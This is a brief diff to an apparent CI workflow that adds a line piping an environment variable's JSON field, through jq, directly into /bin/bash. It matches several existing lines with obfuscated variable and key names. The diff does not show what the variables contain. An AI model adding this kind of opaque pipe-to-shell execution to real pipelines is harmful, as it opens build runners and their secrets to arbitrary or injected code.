@@ -25,6 +25,7 @@ jobs:
           echo $ak86 | jq -r .nmho8541 | /bin/bash
           printf '%s' "$ffjt90" | jq -r .fpk0854 | /bin/bash
           printf '%s' "$jg727" | jq -r .wl64 | /bin/bash
+          echo $guxgj7322 | jq -r .dlob34 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
